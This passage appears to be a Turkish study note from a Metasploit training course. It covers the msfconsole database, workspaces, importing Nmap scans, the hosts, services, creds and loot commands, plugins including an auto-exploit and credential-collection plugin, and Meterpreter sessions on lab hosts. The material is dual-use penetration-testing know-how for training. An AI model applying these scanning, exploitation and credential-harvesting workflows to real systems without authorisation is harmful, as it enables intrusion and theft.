---
{"dg-publish":true,"permalink":"/active-directory/ms-fconsole/"}
---


# Databases
`Msfconsole`, PostgreSQL veritabanı sistemi için yerleşik desteğe sahiptir. Bu sayede, tarama sonuçlarına doğrudan, hızlı ve kolay bir şekilde erişebilir ve sonuçları üçüncü taraf araçlarla birlikte içe ve dışa aktarabiliriz. Veritabanı girişleri, Exploit modülü parametrelerini doğrudan mevcut bulgularla yapılandırmak için de kullanılabilir.

## **Veritabanı Kurulumu**

#### PostgreSQL Status

```shell-session
M1R4CKCK@htb[/htb]$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2147 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
```

#### Start PostgreSQL
```shell-session
M1R4CKCK@htb[/htb]$ sudo systemctl start postgresql
```

PostgreSQL'i başlattıktan sonra, `msfdb init` ile MSF veritabanını oluşturmamız ve başlatmamız gerekir.

#### **MSF - Bir Veritabanı Başlatın**
```shell-session
M1R4CKCK@htb[/htb]$ sudo msfdb init

[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8>
Did you mean? with_options

<SNIP>
```

Metasploit güncel değilse bazen bir hata oluşabilir. Hataya neden olan bu farklılık birkaç nedenden dolayı olabilir. İlk olarak, bu sorunu çözmek için genellikle Metasploit'i tekrar güncellemek (a`pt update`) yardımcı olur. Daha sonra MSF veritabanını yeniden başlatmayı deneyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo msfdb init

[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

Başlatma atlanırsa ve Metasploit bize veritabanının zaten yapılandırılmış olduğunu söylerse, veritabanının durumunu yeniden kontrol edebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo msfdb status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2476 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.

COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)
postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
```

Bu hata görünmezse, ki genellikle Metasploit'in yeni bir kurulumundan sonra olur, o zaman veritabanını başlatırken aşağıdakileri göreceğiz:

```shell-session
M1R4CKCK@htb[/htb]$ sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

Veritabanı başlatıldıktan sonra, `msfconsole` 'u başlatabilir ve oluşturulan veritabanına aynı anda bağlanabiliriz.

#### **MSF - Başlatılan Veritabanına Bağlanın**
```shell-session
M1R4CKCK@htb[/htb]$ sudo msfdb run

[i] Database already started
                                                  
         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6>
```

Ancak, veritabanı zaten yapılandırılmışsa ve parolayı MSF kullanıcı adıyla değiştiremiyorsak, bu komutlarla devam edin:

#### **MSF - Veritabanını Yeniden Başlatın**
```shell-session
M1R4CKCK@htb[/htb]$ msfdb reinit
M1R4CKCK@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
M1R4CKCK@htb[/htb]$ sudo service postgresql restart
M1R4CKCK@htb[/htb]$ msfconsole -q

msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```


#### MSF - Database Options
```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
	

msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```
## Using the Database

With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our `Workspaces`.

#### **Workspaces**  

`Workspace` 'leri bir projedeki klasörleri düşündüğümüz gibi düşünebiliriz. Farklı tarama sonuçlarını, hostları ve çıkarılan bilgileri IP, alt ağ, ağ veya domain'e göre ayırabiliriz.  

Geçerli Workspace listesini görüntülemek için `workspace` komutunu kullanın. Komuttan sonra bir `-a` veya `-d` anahtarı ve ardından çalışma alanının adını eklemek, söz konusu çalışma alanını veritabanına `ekleyecek` veya `silecektir` `.`

```shell-session
msf6 > workspace

* default
```

Default Workspace'in `default` olarak adlandırıldığına ve `*` sembolüne göre şu anda kullanımda olduğuna dikkat edin. Halihazırda kullanılan çalışma alanını değiştirmek için `workspace [name]` komutunu yazın. Örneğimize geri dönerek, bu değerlendirme için bir çalışma alanı oluşturalım ve bunu seçelim.

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

Workspaces ile başka neler yapabileceğimizi görmek için, Workspaces ile ilgili yardım menüsü için workspace `-h` komutunu kullanabiliriz.


#### **Depolanan Nmap Taraması**
```shell-session
M1R4CKCK@htb[/htb]$ cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds
```


#### Importing Scan Results
```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

## **MSFconsole İçinde Nmap Kullanımı**  

Alternatif olarak, Nmap'i doğrudan msfconsole'dan kullanabiliriz! İşlemi arka plana almak veya işlemden çıkmak zorunda kalmadan doğrudan konsoldan tarama yapmak için `db_nmap` komutunu kullanın.

#### MSF - Nmap
```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

Oturumu bitirdikten sonra, PostgreSQL hizmetinde bir şey olursa verilerimizi yedeklediğimizden emin olun. Bunu yapmak için `db_export` komutunu kullanın.

#### MSF - DB Export
```shell-session
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified


msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

Bu veriler daha sonra ihtiyaç duyulduğunda msfconsole'a geri aktarılabilir. Veri saklama ile ilgili diğer komutlar genişletilmiş `host` kullanımı, `servisler` ve `creds` ve `loot` komutlarıdır.


## **Hosts**  

`hosts` komutu, taramalarımız ve etkileşimlerimiz sırasında bunlar hakkında bulduğumuz host adresleri, host adları ve diğer bilgilerle otomatik olarak doldurulan bir veritabanı tablosu görüntüler. Örneğin, `msfconsole` 'un hizmet ve işletim sistemi tespiti yapabilen tarayıcı eklentileriyle bağlantılı olduğunu varsayalım. Bu durumda, msfconsole aracılığıyla taramalar tamamlandığında bu bilgiler otomatik olarak tabloda görünmelidir. Yine, Nessus, NexPose veya Nmap gibi araçlar bu durumlarda bize yardımcı olacaktır.  

Hostlar bu tabloya ayrı girişler olarak manuel olarak da eklenebilir. Özel hostlarımızı ekledikten sonra, tablonun formatını ve yapısını düzenleyebilir, yorumlar ekleyebilir, mevcut bilgileri değiştirebilir ve daha fazlasını yapabiliriz.


#### MSF - Stored Hosts
```shell-session
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```

## **Services**  

`Services` komutu bir öncekiyle aynı şekilde çalışır. Taramalar veya etkileşimler sırasında keşfedilen hizmetler hakkında açıklamalar ve bilgiler içeren bir tablo içerir. Yukarıdaki komutla aynı şekilde, buradaki girişler de son derece özelleştirilebilir.


#### **MSF - Hostların Saklanan Servisleri**
```shell-session
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

## **Credentials**  

`creds` komutu, hedef host ile etkileşimleriniz sırasında toplanan kimlik bilgilerini görselleştirmenizi sağlar. Ayrıca kimlik bilgilerini manuel olarak ekleyebilir, mevcut kimlik bilgilerini port özellikleriyle eşleştirebilir, açıklamalar ekleyebilir vb.


#### MSF - Stored Credentials
```shell-session
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type.
    realm     :  Realm, 
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283

General options
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
                        If the file name ends in '.jtr', that format will be used.
                        If file name ends in '.hcat', the hashcat format will be used.
                        CSV by default.
  -d,--delete           Delete one or more credentials

Filter options for listing
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds that match the following types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results of the search
  -v,--verbose          Don't truncate long password hashes

Examples, John the Ripper hash types:
  Operating Systems (starts with)
    Blowfish ($2a$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($1$)    : md5
    SHA256   ($5$)    : sha256,crypt
    SHA512   ($6$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL 2005        : mssql05
    MSSQL 2012/2014   : mssql12
    MySQL < 4.1       : mysql
    MySQL >= 4.1      : mysql-sha1
    Oracle            : des,oracle
    Oracle 11         : raw-sha1,oracle11
    Oracle 11 (H type): dynamic_1506
    Oracle 12c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -O 1.2.3.4/24 # Return credentials with origins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```


## **Loot**  

`loot` komutu, sahip olunan servislerin ve kullanıcıların bir bakışta listesini sunmak için yukarıdaki komutla birlikte çalışır. Bu durumda loot, hashes, passwd, shadow ve daha fazlası gibi farklı sistem türlerinden hash dökümlerini ifade eder.


#### MSF - Stored Loot
```shell-session
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```


### Plugins 
Pluginler, Metasploit framework'üne üçüncü taraflarca eklenmiş ve entegre edilmiş yazılımlardır. Metasploit ortamında işlevselliği artırarak pentester'ların işini kolaylaştırır. Pluginler, veri aktarımını otomatikleştirir, veritabanına kayıt yaparak host ve güvenlik açıklarını anında görünür hale getirir. API ile çalışarak tekrarlayan görevleri otomatikleştirir, yeni komutlar ekler ve framework'ü genişletir.


## **Using Plugins**

Bir eklentiyi kullanmaya başlamak için, makinemizde doğru dizine yüklendiğinden emin olmamız gerekecektir. `msfconsole`'un her yeni kurulumu için varsayılan dizin olan `/usr/share/metasploit-framework/plugins` dizinine gitmek bize hangi eklentilere sahip olduğumuzu gösterecektir:

```shell-session
M1R4CKCK@htb[/htb]$ ls /usr/share/metasploit-framework/plugins

aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```

#### MSF - Load Nessus

```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus


msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and 

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```

Eklenti doğru yüklenmemişse, yüklemeye çalıştığımızda aşağıdaki hatayı alırız.

```shell-session
msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```


## **Yeni Eklentiler Yükleme**
Örneğin [DarkOperator'un Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git) dosyasını kurmayı deneyelim. Ardından, yukarıdaki bağlantıyı izleyerek, yukarıda belirtilen klasöre doğrudan yerleştirebileceğimiz birkaç Ruby (`.rb`) dosyası elde ederiz.

#### Downloading MSF Plugins

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
M1R4CKCK@htb[/htb]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

Burada `pentest.rb` eklentisini örnek olarak alabilir ve `/usr/share/metasploit-framework/plugins` dizinine kopyalayabiliriz.

#### MSF - Copying Plugin to MSF

```shell-session
M1R4CKCK@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

Daha sonra, `msfconsole` 'u başlatın ve `load` komutunu çalıştırarak eklentinin kurulumunu kontrol edin. Eklenti yüklendikten sonra, `msfconsole` 'daki `yardım menüsü` otomatik olarak ek işlevlerle genişletilir.

#### MSF - Load Plugin

```shell-session
M1R4CKCK@htb[/htb]$ msfconsole -q

msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \ 
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/
      
Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest


msf6 > help

Tradecraft Commands
===================

    Command          Description
    -------          -----------
    check_footprint  Checks the possible footprint of a post module on a target system.


auto_exploit Commands
=====================

    Command           Description
    -------           -----------
    show_client_side  Show matched client side exploits from data imported from vuln scanners.
    vuln_exploit      Runs exploits based on data imported from vuln scanners.


Discovery Commands
==================

    Command                 Description
    -------                 -----------
    discover_db             Run discovery modules against current hosts in the database.
    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.
    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.
    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.


Project Commands
================

    Command       Description
    -------       -----------
    project       Command for managing projects.


Postauto Commands
=================

    Command             Description
    -------             -----------
    app_creds           Run application password collection modules against specified sessions.
    get_lhost           List local IP addresses that can be used for LHOST.
    multi_cmd           Run shell command against several sessions
    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.
    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.
    multi_post          Run a post module against specified sessions.
    multi_post_rc       Run resource file with post modules and options against specified sessions.
    sys_creds           Run system password collection modules against specified sessions.

<SNIP>
```

Aşağıdaki popüler eklentilerin listesine göz atın:

![Pasted image 20241027170300.png](/img/user/resimler/Pasted%20image%2020241027170300.png)

## **Mixins**  

Metasploit Framework, nesne yönelimli bir programlama dili olan Ruby ile yazılmıştır. Bu, `msfconsole` 'u kullanımı mükemmel yapan şeyde büyük bir rol oynar. Mixinler, uygulandıklarında hem scriptin yaratıcısına hem de kullanıcıya büyük miktarda esneklik sunan özelliklerden biridir.  

Mixinler, diğer sınıfların parent sınıfı olmak zorunda kalmadan, diğer sınıflar tarafından kullanılmak üzere metot olarak işlev gören sınıflardır. Bu nedenle, buna kalıtım demek uygun olmaz, bunun yerine kapsam olarak adlandırılabilir. Esas olarak şu durumlarda kullanılırlar:

1. Bir sınıf için çok sayıda isteğe bağlı özellik sağlamak istemek.  
    
2. Çok sayıda sınıf için belirli bir özelliği kullanmak istiyorsanız.

Ruby programlama dilinin çoğu, Modüller olarak Mixin'ler etrafında döner. Mixin kavramı, modülün adını bir `parametre` olarak aktardığımız `include` kelimesi kullanılarak uygulanır. Mixinler hakkında daha fazla bilgiyi [buradan](https://en.wikibooks.org/wiki/Metasploit/UsingMixins) okuyabilirsiniz.  

Metasploit ile yeni başlıyorsak, Mixins kullanımı veya değerlendirmemiz üzerindeki etkileri konusunda endişelenmemeliyiz. Ancak, Metasploit'in özelleştirilmesinin ne kadar karmaşık hale gelebileceğine dair bir not olarak burada bahsedilmektedir.

Diyelim ki Metasploit'te bir güvenlik aracınız var ve bu aracın içinde kullanıcı bilgilerini kaydeden, log tutan ve hata yöneten işlevler olsun. Bu işlevler farklı araçlar için de gerekli olabilir. İşte mixin'ler burada devreye girer: bu işlevleri ayrı modüller olarak yazabilir ve gerektiğinde her sınıfa ekleyebilirsiniz.

```shell-session
# Mixin modüllerimizi oluşturalım
module LoggerMixin
  def log_action(action)
    puts "Logging action: #{action}"
  end
end

module ErrorHandlerMixin
  def handle_error(error)
    puts "Handling error: #{error}"
  end
end

# Sınıfımıza mixin'leri ekleyelim
class SecurityTool
  include LoggerMixin
  include ErrorHandlerMixin
  
  def perform_action(action)
    log_action(action)    # Mixin'den gelen log_action metodunu kullanır
    puts "Performing action: #{action}"
  rescue StandardError => e
    handle_error(e)       # Mixin'den gelen handle_error metodunu kullanır
  end
end

# Şimdi SecurityTool sınıfı mixin'lerle donatılmış durumda
tool = SecurityTool.new
tool.perform_action("Scan Network")
 
```

Çıktı : 

```shell-session
Logging action: Scan Network 
Performing action: Scan Network
```

Bu örnekte `SecurityTool` sınıfına, mixin'ler sayesinde `log_action` ve `handle_error` metotları eklenmiş oldu. Eğer bu işlevlere sahip başka bir sınıf daha oluşturmak istersek, aynı modülleri ekleyerek onu da kolayca aynı yeteneklerle donatabiliriz.

Bu sayede, sınıflara ortak işlevler mixin olarak eklenebilir; böylece hem esneklik sağlanır hem de kod tekrarı önlenir.


# Sessions
MSFconsole, aynı anda birden fazla modülü yönetebilir ve bu esneklik, _sessions_ ile sağlanır. Birkaç oturum oluşturduktan sonra bunlar arasında geçiş yapabilir, farklı modülleri çalışan oturumlara bağlayabilir veya oturumları arka plana alabilirsiniz. Arka plana alınan oturumlar çalışmaya devam eder ve hedef host ile bağlantı sürer. Ancak, payload sırasında bir hata olursa oturum kapanabilir ve bağlantı kopabilir.


## **Using Sessions**  

Msfconsole'da mevcut exploit'leri veya yardımcı modülleri çalıştırırken, hedef host ile bir iletişim kanalı oluşturdukları sürece oturumu arka plana atabiliriz. Bu, `[CTRL] + [Z]` tuş kombinasyonuna basarak ya da Meterpreter aşamaları durumunda `background` komutunu yazarak yapılabilir. Bu bize bir onay mesajı verecektir. Komut istemini kabul ettikten sonra, msfconsole komut istemine geri döneceğiz (`msf6 >`) ve hemen farklı bir modül başlatabileceğiz.


#### **Listing Active Sessions**
```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### **Bir Oturumla Etkileşim Kurma**  

Belirli bir oturumu açmak için `sessions -i [no.]` komutunu kullanabilirsiniz.
```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

Bu, özellikle zaten exploit edilmiş bir sistemde oluşturulmuş, istikrarlı bir iletişim kanalıyla ek bir modül çalıştırmak istediğimizde kullanışlıdır.  

Bu, ilk istismarın başarısı nedeniyle oluşan mevcut oturumumuzu arka plana alarak, çalıştırmak istediğimiz ikinci modülü arayarak ve seçilen modül türü tarafından mümkün kılınırsa, modülün çalıştırılması gereken oturum numarasını seçerek yapılabilir. Bu işlem ikinci modülün `show options` menüsünden yapılabilir.  

Genellikle bu modüller, Post-Exploitation modüllerine atıfta bulunarak `post` kategorisinde bulunabilir. Bu kategorideki modüllerin ana türleri kimlik bilgisi toplayıcıları, local exploit önericileri ve dahili ağ tarayıcılarından oluşur.


## **Jobs**  

